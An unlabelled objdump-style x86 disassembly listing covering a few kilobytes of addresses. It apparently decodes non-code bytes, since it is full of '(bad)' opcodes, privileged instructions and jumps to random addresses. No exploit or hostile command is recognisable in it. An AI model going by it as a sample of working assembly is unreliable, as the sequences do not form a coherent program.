  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
